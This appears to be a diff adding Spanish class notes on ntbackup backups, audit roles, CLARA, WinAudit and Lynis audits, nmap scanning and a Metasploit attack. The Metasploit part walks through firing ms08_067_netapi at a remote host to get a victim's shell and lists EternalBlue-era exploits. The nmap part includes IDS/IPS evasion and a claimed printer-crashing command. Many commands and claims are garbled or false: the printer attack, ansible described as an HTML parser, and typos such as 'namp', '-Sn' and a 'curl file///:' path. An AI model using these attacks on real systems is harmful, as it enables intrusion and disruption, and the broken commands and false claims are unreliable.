+10. Ahora formateamos el RAID5. Sobre el RAID5 click derecho del ratón -\> formatear
+    - Para formateo desde cmd
+
+      ``` cmd
+      C:\>format E: /q
+      ```
+
+<!-- -->
+
+12. ahora restauramos la copia de seguridad
+    - Simplemente clickamos sobre copia1.bak y nos aparece el asistente de copia de seguridad
+
+    - Restaurar archivos de configuración
+
+    - Seleccionar elementos para restaurar
+13. Se genera también un informe de a restauración que se puede guardas
+14. Comprobamos que todo está correcto
+
+### Copias de seguridad programadas
+
+1.  inicio -\> ejecutar -\> ntbackup
+2.  empezar siempre en modo asistente
+3.  efectuar una copia de seguridad de archivos y configuración
+4.  Elegir lo que deseo incluir en la copia de seguridad
+5.  Elegimos el RAID5
+6.  Lo llamamos copia2.bkf
+7.  En finalización del asistente vamos a opciones avanzadas y podemos elegir
+    - Copia normal - Copia usual como la anterior
+
+    - copia incremental - Solo los archivos que se hayan alterado se copian
+
+    - copia diaria
+8.  En la siguiente ventana checkeamos
+    - Comprobar los datos después de copia de seguridad
+
+    - Deshabilitar instantáneas de volumen - Cuando se hace una copia de seguridad puede que haya alguien con un word/excel o algun archivo abierto y volcando datos al temporal. Si hacemos una copia de seguridad sin esto se dañan esos archivos.
+9.  Elegimos anexar la copia
+10. Cuando hacer la copia de segurdad
+    - Ahora - Copia manual normal, sin automatizar
+
+    - Elegimos más adelante
+
+      - Nombre del trabajo: auto1
+
+      - Fecha de inicio
+
+      - Programación: mensualmente/diario/anual....
+
+      - Hora de inicio: 13:00
+
+      - Programación de la tarea
+
+        - El dia 1 de mes
+
+        - el primer lunes de los meses
+
+      - Se pueden hacer muchas cosas más como elegir los meses, los días,...
+11. Como es una tarea programada pide usuario y contraseña de un usuario con permisos administrativos
+12. Vuelve a pedir usuario y contraseña y finalmente aparece un resumen antes de finalizar
+
+Ahora podemos ver trabajos programados:
+
+1.  Inicio -\> ejecutar -\> ntbackup
+2.  En la primera pantalla del asistente, en azúl, le damos a modo avanzado
+3.  Programador de trabajos
+4.  Aparece un calendario con todos los trabajos programados
+5.  Si clickamos sobre el icono de algún trabajo en el calendario se puede editar o eliminar (se eliminan todos los trabajos)
+
+## AUDITORIA CON RELACIÓN A UN INCIDENTES DE SEGURIDAD
+
+- **Auditor** - Persona que emite un juicio experto sobre un tema en concreto. Los juicios pueden ser:
+
+  - Conformidad - Todos bien
+
+  - Observaciones - Algo anda mal y debe ser solucionado en 3 meses
+
+  - No conformidad - La empresa no puede seguir su labor hasta solucionarlos
+
+- El auditor puede ser:
+
+  - Interno - Personal de empresa pero nunca puede pertenecer o tener relación con el departamento a auditar
+
+    - Tiene una labor de asesoramiento y puede contratar a un grupo externo de expertos
+
+    - Verifica el cumplimiento legal y técnico
+
+    - Funciona por carta convenio usualmente
+
+  - Externo - No es personal de empresa y no puede realizar funciones de asesoría durante la auditoría
+
+    - Se ciñe a pruebas de cumplimiento y pruebas sustantivas
+
+    - Prepara un informe de auditoria
+
+    - Puede emitir después unas conclusiones y un asesoramiento
+
+    - Si las pruebas de cumplimiento son correctas solo se requiere un muestreo de las máquinas pero si no son correctas pode pruebas sustantivas de todas las máquinas.
+
+    - Se genera un informe por cada parte interesada más uno para el auditor. Por ejemplo, si mi empresa trabaja con una base de datos de la comunidad de madrid, se genera un informe para la comunidad de madrid también
+
+## AUDITORIA EN WINDOWS 10
+
+1.  Se usa el programa Clara que pertenece al centro criptográfico nacional, su tenencia y uso sin licencia o permiso es ilegal, aunque es posible descargarlo, la web sabe quién lo descarga y si tiene permisos para ello.
+2.  Aparece una terminal y luego un login
+    - Auditor: nombre del auditor
+
+    - Organización: A quién audito
+
+    - Unidad: Qué departamento de la empresa
+3.  Luego le damos a analizar
+4.  Aparece el grado de cumplimiento segun el ENS
+5.  Cuando termina genera un informe en html o xlm
+6.  El programa genera informes independientes de cada máquina y genera siempre 2 informes
+
+Clara audita solo sistemas operativos de 64 bits para sistemas de 32 bits se usa winaudit
+
+WinAudit es completamente seguro y legal usarlo. Hay multitud de programas de auditoria gratuitos, propietarios, bajo licencia,...
+
+## AUDITORIAS EN LINUX
+
+1.  instalar lynis ansible y kbtin
+
+    ```{bash}
+    #| eval: false
+    sudo apt-get install lynis ansible kbtin
+    ```
+
+Lynis hace auditorias, ansible es un parser que convierte a html y kbtin es un paquete de colores para html
+
+2.  Corremos lynis de forma normal, nos muestra el informe en terminal
+
+    ```{bash}
+    #| eval: false
+    sudo lynis audit system
+    ```
+
+3.  Para convertirlo a informe
+
+    ```{bash}
+    #| eval: false
+    sudo lynis audit system | ansi2html > auditoria.html
+    ```
+
+4.  Para abrir el archivo bien podemos abrirlo por entorno gráfico y nos abre mozzilla para verlo o podemos verlo por terminal con curl (es un navegador por terminal)
+
+    ```{bash}
+    #| eval: false
+    curl file///:ruta absoluta al html 
+    ```
+
+## AUDITORIA CON NMAP
+
+NetworkMapper (nmap) es una herramienta de mappeo de la red muy poderosa pero hay que instalarla
+
+```{bash}
+#| eval: false
+sudo apt-get install nmap xsltproc
+```
+
+xsltproc es un conversor a xml para informes
+
+- Escaneo de red simple - Muestra las máquinas conectadas
+
+  ```{bash}
+  #| eval: false
+  nmap 192.168.1.0/24
+  ```
+
+- Muesta los SO
+
+  ```{bash}
+  #| eval: false
+  nmap -O 192.168.1.0/24
+  ```
+
+- Muestra información más detallada en red e intenta adivinar el SO de forma más agresiva (A de agressive)
+
+  ```{bash}
+  #| eval: false
+  nmap -A 192.168.1.0/24
+  ```
+
+- Información mucho más completa
+
+  ```{bash}
+  #| eval: false
+  nmap -sV -O -A 192.168.1.0/24
+  ```
+
+- Escaneo intenso de red
+
+  ```{bash}
+  #| eval: false
+  nmap -T4 -A 192.168.1.0/24
+  ```
+
+  nmap tiene 5 niveles de agresividad, el 5 es el más agresivo, el 1 el menos y más silencioso. Con el 4 y el 5 un sistema IPS nos ve y nos para perfectamente
+
+- Escaneo intenso centrado en UDP
+
+  ```{bash}
+  #| eval: false
+  nmap -sS -sU -T4 -A 192.168.1.0/24
+  ```
+
+- Escaneo intenso centrado en TCP
+
+  ```{bash}
+  #| eval: false
+  nmap -p -1-65535 -T4 -A 192.168.1.0/24
+  ```
+
+  Le estamos diciendo que haga un escaneo agresivo de los 65535 puertos
+
+- Escaneo intenso sin o con ping
+
+  ```{bash}
+  #| eval: false
+  nmap -T4 -A -Pn 192.168.1.0/24 #sin ping
+  nmap -Sn 192.168.1.0/24 # Con ping
+  nmap -sV -T4 -O -F -version-light 192.168.1.0/24 #escaneo rápido 
+  ```
+
+- Escaneo saltandonos los IPS/IDS
+
+  ```{bash}
+  #| eval: false
+  nmap -sS IP DE MAQUINA
+  ```
+
+- Generar informes
+
+  ```{bash}
+  #| eval: false
+  nmap -T4 -A 192.168.1.0/24 > red.txt
+  nmap -T4 -A 192.168.1.0/24 | ansi2html > red.html
+  namp -T4 -A 192.168.1.0/24 -oX informe.xml
+  nmap -T4 -A 192.168.1.0/24 | tee informe.txt
+  ```
+
+- Tirar abajo un servidor ftp incluyendo impresoras
+
+  ```{bash}
+  #| eval: false
+  nmap -i -L dirección IP de impresora 
+  ```
+
+Ataca la vulnerabilidad del ftp. En impresoras minota se llena el buffer de la impresora y empieza a escupir papele con simbolitos raros. La unica forma de pararlo es apagar y encender la impresora y rezar para quién lo envió no lo vuelva a hacer
+
+**scannme.org** - es una web para hacer pruebas de nmap con máquinas virtuales
+
+- Comando que muestra las vulnerabilidades de las máquinas conectadas
+
+  ```{bash}
+  #| eval: false
+  nmap -T5 -A --script vuln 192.168.1.0/24 -oX informe.xml 
+  ```
+
+Existe un modo gráfico de nmap llamado zenmap y otros escaners de red como:
+
+- arp-scan (apt-get install)
+
+- wireshark
+
+## ATAQUE CON METASPLOIT
+
+Metasploit es un programa para expotar vulnerabilidades. La mayoría de ellas son bien conocidas y están publicadas
+
+Un hacker usa sistemas operativos como Kali linux, o parrot OS que son facilmente identificables pero podríamos instalar una herramienta como metasploit en un inocente debian o en un tails o un kodachi para dejar menos huellas aún
+
+Las armas son de libre disposición y venta, pero su uso está penado
+
+En un navegador buscamos metasploit rapid y vemos como instalarlo. Es simplemente escribir en terminal lo siguiente
+
+```{bash}
+#| eval: false
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+  chmod 755 msfinstall && \
+  ./msfinstall
+```
+
+Existe version para windows y una version especial para Linux con paquetería snap. Existe también una versión de pago
+
+1.  identificamos las vulnerabilidades con nmap. nmap tiene los prismaticos y le dice las coordenadas y el calibre de la bala a metasploit
+
+2.  ahora en linux escribimos en terminal
+
+    ```{bash}
+    #| eval: false
+    msfconsole #inicia metasploit
+    msf > search ms08_067_netapi #le decimos a metasploit que busque la bala 
+    msf > use 82                 # Carga la bala 
+    msf > RHOSTS 192.169.1.44    # apunta a un remote host
+    msf > LHOST 192.168.1.55     # Apunta a un local host 
+    msf > run
+    msf > exploit                # Ambos comandos disparan
+    # ahora puede que aparezcan dos cosas
+    meterpreper 
+    #ponemos 
+    shell 
+    ## puede que aparezca también 
+    Microsoft windows version....
+    > # ya estamos en la cmd de la victima
+    ```
+
+- ms08_067_netapi- Vulnerabilidad de windows XP
+
+  - Una de las vulnerabilidades más populares de Microsoft windows. Te da acceso como usuario en le grupo SYSTEM (Absolutamente todos los privilegios). Actualmente cualquier firewall lo para. Funciona para:
+
+    - Windows XP
+
+    - Windows 2000
+
+    - windows 2003
+
+- ms03_026_dcom - Vulnerabilida de windows server 2003. DCOM es la tecnoligía que usa RPC para que diferentes programas puedan compartir datos. RPC es una herramienta del sistema operativo que permite a la computadora pedir cosas a otra en red. El sistema RPC no comprueba cuantos datos está recibiendo, es decir, que se puede desbordar. Los datos desbordados sobreescriben la memoria del sistema. RDP es el escritorio remoto de windows
+
+- ms12-020 - Usa también la RDP. Como hemos visto antes, RDP no procesa correctamente los paquetes en la memoria por lo que permite correr codigos arbitrario mediante el envio de paquetes RDP modificados que provocan acceso a un objeto que no se ha inicializado de forma correcta o que se suprime. Ataca a:
+
+  - windows XP
+
+  - windows server 2003
+
+  - windows server 2008
+
+  - windows 7
+
+  - windows vista
+
+- ms17_010_eternalblue (eternal blue) - Da accesos de grupo SYSTEM (Todos los privilegios) y control total del kernel. Puede ser usado en entornos internos (loboratorio) y externos. Fue desarrollado por la NSA como herramienta de pirateo y espionaje y filtrada al público el 14 de abril de 2017. La NSA tenía un programa dedicado a listar vulnerabilidades sin comunicarselas a Microsoft ni apple. Cualquier dispositivo de la familia windows es vulnerable, no solo eso, cualquier sistema basado en el intercambio de archivos SMBv1 (Server Message Block versión 1) está en riesgo de ser atacado por eternal Blue. Los siguientes sistemas son los más atacados por eternal blue:
+
+  - windows XP x86
+
+  - windows 2003 x86
+
+  - windows 7 x86/x64
+
+  - windows 2008 R2 x64
+
+- MS17-010_psexec - Como eternal blue pero sin acceso al kernel. Afecta a los mismos equipos que eternal blue, funciona parecido y ataca a los mismos sistemas
+
+Guía detallada de nmap y metasploit (en inglés): <https://medium.com/>@sumayasomow/metasploit-framework-part-1-9e168e2abf35
+
+Guía de metasploit (en Español): <https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.educa.jcyl.es/crol/es/recursos-educativos/introduccion-metasploit-framework.ficheros/1460478-Introducci%25C3%25B3n%2520a%2520Metasploit%2520framework.pdf&ved=2ahUKEwjJ0ZPktcqVAxWQUaQEHbR_F-0QFnoECBgQAQ&usg=AOvVaw12-QH_i1ZNkbtkNql6el9o>
